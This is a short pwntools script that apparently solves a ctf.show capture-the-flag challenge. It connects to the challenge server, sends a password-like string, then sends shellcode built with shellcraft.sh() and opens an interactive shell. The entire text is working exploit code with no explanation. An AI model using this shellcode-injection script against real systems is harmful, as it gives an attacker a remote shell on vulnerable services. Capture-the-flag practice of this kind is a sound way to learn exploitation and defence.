from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28286)
shellcode = asm(shellcraft.sh())
payload = shellcode 
io.sendline("CTFshowPWN")
io.send(payload)
io.recv()
io.interactive()
